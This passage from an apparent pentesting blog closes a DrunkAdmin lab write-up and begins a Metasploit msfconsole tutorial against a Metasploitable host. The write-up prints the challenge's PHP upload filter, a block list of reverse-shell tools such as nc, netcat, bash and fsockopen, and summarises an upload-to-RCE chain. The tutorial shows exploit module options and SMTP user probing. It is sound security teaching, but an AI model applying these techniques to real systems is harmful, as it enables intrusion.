</span><span class='line'><span class="n">testme</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">&quot;Enter string to check if base64: &quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">try</span><span class="p">:</span>
</span><span class='line'>    <span class="n">base64</span><span class="o">.</span><span class="n">decodestring</span><span class="p">(</span><span class="n">testme</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="n">base64</span><span class="o">.</span><span class="n">decodestring</span><span class="p">(</span><span class="n">testme</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">except</span> <span class="n">binascii</span><span class="o">.</span><span class="n">Error</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[x] Sorry, this isn&#39;t base64&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the the script did return the same output that I had decoded earlier: <code>Lh%1L<sup>r2CH7</sup>%7Q#</code>. So this time, I tried to enter this string in the decrypt form..and the message was revealed!</p>

<p><code>Alice, prepare for a kinky night. Meet me at &lsquo;35.517286&rsquo; &lsquo;24.017637&rsquo;</code></p>

<p>Yes! The message was decrypted and challenge completed! I was curious though and looked at the coordinates in Google Maps. It seems that Bob and Alice&rsquo;s chosen place of fun is a location in Greece:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/drunkadmin/location.png" title="meeting location" alt="secret location"></p>

<p>Before wrapping up, do you remember the upload filter that caught the malicious uploads and gave a naughty message? I took a peek at it and here&rsquo;s the filter part:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;Submit&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$errors</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$file</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;./images/</span><span class="si">$image_name</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;perl&quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;bash&quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;sh -c&quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;python&quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;nc &quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;netcat&quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;base64&quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;ruby&quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;fsockopen&quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;xterm&quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;gcc&quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s1">&#39;$_GET&#39;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s1">&#39;$_POST&#39;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s1">&#39;$_SERVER&#39;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s1">&#39;$_FILES&#39;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s1">&#39;$_COOKIE&#39;</span><span class="p">)</span> <span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>  <span class="k">echo</span> <span class="s2">&quot;&lt;h1&gt;Ohhh you are naughty!&lt;/h1&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;rm ./images/</span><span class="si">$image_name</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">die</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Nice twist on this file upload vulnerability!</p>

<h1>Report</h1>

<p>This was another interesting challenge that seemed straightforward at the beginning but required more trial and error to solve. The steps that led to the exploitation were:</p>

<ul>
<li><p>server was vulnerable to unrestricted file upload that led to remote code execution</p></li>
<li><p>the filter that tried to protect against malicious code didn&rsquo;t stop everything that an attacker could use</p></li>
<li><p>the hidden file was not so hidden in the <em>/var/www</em> directory</p></li>
<li><p>files in Bob&rsquo;s home folder were readable, allowing the decryption of the secret message</p></li>
</ul>


<p>The key takeaway for me was to start simple and build from there when testing stuff. I would have saved so much time if I had tried a simple PHP code execution test, instead of throwing reverse shells and scratching my head when it didn&rsquo;t work</p>

<p>And today, instead of a cookie, I leave here the picture that gets displayed when you go to a non existent page on the server:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/drunkadmin/think.png" title="think" alt="hmm"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest tools - Metasploit]]></title>
    <link href="http://chousensha.github.io/blog/2016/06/11/pentest-tools-metasploit/"/>
    <updated>2016-06-11T13:57:36-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/06/11/pentest-tools-metasploit</id>
    <content type="html"><![CDATA[<p>In this post I am going to focus on the use of Metasploit.</p>

<p>Before starting, I want to leave here some links to good resources for learning Metasploit:</p>

<p><a href="https://www.offensive-security.com/metasploit-unleashed/">Offensive Security Metasploit Unleashed free training course</a></p>

<p><a href="http://www.securitytube.net/groups?operation=view&amp;groupId=8">SecurityTube Metasploit Megaprimer</a></p>

<p><a href="https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf">SANS Metasploit Cheatsheet</a></p>

<p><a href="http://www.amazon.com/Metasploit-Penetration-Testers-David-Kennedy/dp/159327288X?ie=UTF8&amp;*Version*=1&amp;*entries*=0">Metasploit: The Penetration Tester&rsquo;s Guide</a></p>

<!-- more -->


<h1>Msfconsole</h1>

<p>The <code>msfconsole</code> (Metasploit Framework Console) is where you will be spending most of your time when working with Metasploit. You can do almost everything from here, but the amount of commands might seem overwhelming at first.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/metasploit/msfbanner.png" title="msfconsole" alt="metasploit framework"></p>

<p>Besides the Metasploit functionality, you <strong>can run external commands in the console</strong>, which is really helpful.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; uname -a
</span><span class='line'>[*] exec: uname -a
</span><span class='line'>
</span><span class='line'>Linux pwnbox 4.0.0-kali1-amd64 #1 SMP Debian 4.0.4-1+kali2 (2015-06-03) x86_64 GNU/Linux</span></code></pre></td></tr></table></div></figure>


<p>The first thing you probably want to do is look at the help menu:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help
</span><span class='line'>
</span><span class='line'>Core Commands
</span><span class='line'>=============
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    ?             Help menu
</span><span class='line'>    advanced      Displays advanced options for one or more modules
</span><span class='line'>    back          Move back from the current context
</span><span class='line'>    banner        Display an awesome metasploit banner
</span><span class='line'>    cd            Change the current working directory
</span><span class='line'>    color         Toggle color
</span><span class='line'>    connect       Communicate with a host
</span><span class='line'>    edit          Edit the current module with $VISUAL or $EDITOR
</span><span class='line'>    exit          Exit the console
</span><span class='line'>    get           Gets the value of a context-specific variable
</span><span class='line'>    getg          Gets the value of a global variable
</span><span class='line'>    grep          Grep the output of another command
</span><span class='line'>    help          Help menu
</span><span class='line'>    info          Displays information about one or more modules
</span><span class='line'>    irb           Drop into irb scripting mode
</span><span class='line'>    jobs          Displays and manages jobs
</span><span class='line'>    kill          Kill a job
</span><span class='line'>    load          Load a framework plugin
</span><span class='line'>    loadpath      Searches for and loads modules from a path
</span><span class='line'>    makerc        Save commands entered since start to a file
</span><span class='line'>    options       Displays global options or for one or more modules
</span><span class='line'>    popm          Pops the latest module off the stack and makes it active
</span><span class='line'>    previous      Sets the previously loaded module as the current module
</span><span class='line'>    pushm         Pushes the active or list of modules onto the module stack
</span><span class='line'>    quit          Exit the console
</span><span class='line'>    reload_all    Reloads all modules from all defined module paths
</span><span class='line'>    rename_job    Rename a job
</span><span class='line'>    resource      Run the commands stored in a file
</span><span class='line'>    route         Route traffic through a session
</span><span class='line'>    save          Saves the active datastores
</span><span class='line'>    search        Searches module names and descriptions
</span><span class='line'>    sessions      Dump session listings and display information about sessions
</span><span class='line'>    set           Sets a context-specific variable to a value
</span><span class='line'>    setg          Sets a global variable to a value
</span><span class='line'>    show          Displays modules of a given type, or all modules
</span><span class='line'>    sleep         Do nothing for the specified number of seconds
</span><span class='line'>    spool         Write console output into a file as well the screen
</span><span class='line'>    threads       View and manipulate background threads
</span><span class='line'>    unload        Unload a framework plugin
</span><span class='line'>    unset         Unsets one or more context-specific variables
</span><span class='line'>    unsetg        Unsets one or more global variables
</span><span class='line'>    use           Selects a module by name
</span><span class='line'>    version       Show the framework and console library version numbers
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Every time you enter a new context, you can use <strong>help</strong> to see the options available for that context. For instance, after selecting an exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/linux/http/advantech_switch_bash_env_exec
</span><span class='line'>msf exploit(advantech_switch_bash_env_exec) &gt; help
</span><span class='line'>...
</span><span class='line'>Exploit Commands
</span><span class='line'>================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    check         Check to see if a target is vulnerable
</span><span class='line'>    exploit       Launch an exploit attempt
</span><span class='line'>    pry           Open a Pry session on the current module
</span><span class='line'>    rcheck        Reloads the module and checks if the target is vulnerable
</span><span class='line'>    reload        Just reloads the module
</span><span class='line'>    rerun         Alias for rexploit
</span><span class='line'>    rexploit      Reloads the module and launches an exploit attempt
</span><span class='line'>    run           Alias for exploit</span></code></pre></td></tr></table></div></figure>


<p>Or after setting a payload:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Payload Commands
</span><span class='line'>================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    check         Check to see if a target is vulnerable
</span><span class='line'>    generate      Generates a payload
</span><span class='line'>    pry           Open a Pry session on the current module
</span><span class='line'>    reload        Reload the current module from disk</span></code></pre></td></tr></table></div></figure>


<p>Many commands also have their own help menu that you can access by typing <code>help cmd</code> or by passing the -h switch: <code>cmd -h</code>. Let&rsquo;s now glance over some core commands</p>

<h2>Core commands</h2>

<ul>
<li><strong>advanced</strong> &ndash; shows advanced options for a module</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(usermap_script) &gt; advanced
</span><span class='line'>
</span><span class='line'>Module advanced options (exploit/multi/samba/usermap_script):
</span><span class='line'>
</span><span class='line'>   Name           : CHOST
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : The local client address
</span><span class='line'>
</span><span class='line'>   Name           : CPORT
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : The local client port
</span><span class='line'>
</span><span class='line'>   Name           : ConnectTimeout
</span><span class='line'>   Current Setting: 10
</span><span class='line'>   Description    : Maximum number of seconds to establish a TCP connection
</span><span class='line'>
</span><span class='line'>   Name           : ContextInformationFile
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : The information file that contains context information
</span><span class='line'>
</span><span class='line'>   Name           : DisablePayloadHandler
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Disable the handler code for the selected payload
</span><span class='line'>
</span><span class='line'>   Name           : EnableContextEncoding
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Use transient context when encoding payloads
</span><span class='line'>
</span><span class='line'>   Name           : NTLM::SendLM
</span><span class='line'>   Current Setting: true
</span><span class='line'>   Description    : Always send the LANMAN response (except when NTLMv2_session is 
</span><span class='line'>      specified)
</span><span class='line'>
</span><span class='line'>   Name           : NTLM::SendNTLM
</span><span class='line'>   Current Setting: true
</span><span class='line'>   Description    : Activate the 'Negotiate NTLM key' flag, indicating the use of 
</span><span class='line'>      NTLM responses
</span><span class='line'>
</span><span class='line'>   Name           : NTLM::SendSPN
</span><span class='line'>   Current Setting: true
</span><span class='line'>   Description    : Send an avp of type SPN in the ntlmv2 client blob, this allows 
</span><span class='line'>      authentication on Windows 7+/Server 2008 R2+ when SPN is 
</span><span class='line'>      required
</span><span class='line'>
</span><span class='line'>   Name           : NTLM::UseLMKey
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Activate the 'Negotiate Lan Manager Key' flag, using the LM key 
</span><span class='line'>      when the LM response is sent
</span><span class='line'>
</span><span class='line'>   Name           : NTLM::UseNTLM2_session
</span><span class='line'>   Current Setting: true
</span><span class='line'>   Description    : Activate the 'Negotiate NTLM2 key' flag, forcing the use of a 
</span><span class='line'>      NTLMv2_session
</span><span class='line'>
</span><span class='line'>   Name           : NTLM::UseNTLMv2
</span><span class='line'>   Current Setting: true
</span><span class='line'>   Description    : Use NTLMv2 instead of NTLM2_session when 'Negotiate NTLM2' key 
</span><span class='line'>      is true
</span><span class='line'>
</span><span class='line'>   Name           : Proxies
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>
</span><span class='line'>   Name           : SMB::ChunkSize
</span><span class='line'>   Current Setting: 500
</span><span class='line'>   Description    : The chunk size for SMB segments, bigger values will increase 
</span><span class='line'>      speed but break NT 4.0 and SMB signing
</span><span class='line'>
</span><span class='line'>   Name           : SMB::Native_LM
</span><span class='line'>   Current Setting: Windows 2000 5.0
</span><span class='line'>   Description    : The Native LM to send during authentication
</span><span class='line'>
</span><span class='line'>   Name           : SMB::Native_OS
</span><span class='line'>   Current Setting: Windows 2000 2195
</span><span class='line'>   Description    : The Native OS to send during authentication
</span><span class='line'>
</span><span class='line'>   Name           : SMB::VerifySignature
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Enforces client-side verification of server response signatures
</span><span class='line'>
</span><span class='line'>   Name           : SMBDirect
</span><span class='line'>   Current Setting: true
</span><span class='line'>   Description    : The target port is a raw SMB service (not NetBIOS)
</span><span class='line'>
</span><span class='line'>   Name           : SMBDomain
</span><span class='line'>   Current Setting: .
</span><span class='line'>   Description    : The Windows domain to use for authentication
</span><span class='line'>
</span><span class='line'>   Name           : SMBName
</span><span class='line'>   Current Setting: *SMBSERVER
</span><span class='line'>   Description    : The NetBIOS hostname (required for port 139 connections)
</span><span class='line'>
</span><span class='line'>   Name           : SMBPass
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : The password for the specified username
</span><span class='line'>
</span><span class='line'>   Name           : SMBUser
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : The username to authenticate as
</span><span class='line'>
</span><span class='line'>   Name           : SSL
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Negotiate SSL for outgoing connections
</span><span class='line'>
</span><span class='line'>   Name           : SSLCipher
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : String for SSL cipher - "DHE-RSA-AES256-SHA" or "ADH"
</span><span class='line'>
</span><span class='line'>   Name           : SSLVerifyMode
</span><span class='line'>   Current Setting: PEER
</span><span class='line'>   Description    : SSL verification method (Accepted: CLIENT_ONCE, 
</span><span class='line'>      FAIL_IF_NO_PEER_CERT, NONE, PEER)
</span><span class='line'>
</span><span class='line'>   Name           : SSLVersion
</span><span class='line'>   Current Setting: TLS1
</span><span class='line'>   Description    : Specify the version of SSL/TLS to be used (TLS and SSL23 are 
</span><span class='line'>      auto-negotiate) (Accepted: SSL2, SSL3, SSL23, TLS, TLS1, TLS1.1, 
</span><span class='line'>      TLS1.2)
</span><span class='line'>
</span><span class='line'>   Name           : VERBOSE
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Enable detailed status messages
</span><span class='line'>
</span><span class='line'>   Name           : WORKSPACE
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : Specify the workspace for this module
</span><span class='line'>
</span><span class='line'>   Name           : WfsDelay
</span><span class='line'>   Current Setting: 0
</span><span class='line'>   Description    : Additional delay when waiting for a session</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>back</strong> &ndash; allows you to go back from the current module</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(usermap_script) &gt; back
</span><span class='line'>msf &gt; </span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>connect</strong> &ndash; connect to a host on the specified port, like you would do with netcat</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; connect -h
</span><span class='line'>Usage: connect [options] &lt;host&gt; &lt;port&gt;
</span><span class='line'>
</span><span class='line'>Communicate with a host, similar to interacting via netcat, taking advantage of
</span><span class='line'>any configured session pivoting.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -C        Try to use CRLF for EOL sequence.
</span><span class='line'>    -P &lt;opt&gt;  Specify source port.
</span><span class='line'>    -S &lt;opt&gt;  Specify source address.
</span><span class='line'>    -c &lt;opt&gt;  Specify which Comm to use.
</span><span class='line'>    -h        Help banner.
</span><span class='line'>    -i &lt;opt&gt;  Send the contents of a file.
</span><span class='line'>    -p &lt;opt&gt;  List of proxies to use.
</span><span class='line'>    -s        Connect with SSL.
</span><span class='line'>    -u        Switch to a UDP socket.
</span><span class='line'>    -w &lt;opt&gt;  Specify connect timeout.
</span><span class='line'>    -z        Just try to connect, then return.
</span><span class='line'>
</span><span class='line'>msf &gt; connect 192.168.80.156 25
</span><span class='line'>[*] Connected to 192.168.80.156:25
</span><span class='line'>220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
</span><span class='line'>VRFY root
</span><span class='line'>252 2.0.0 root</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>info</strong> &ndash; lists detailed information about a module, including description, vulnerable targets, payload information and more</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
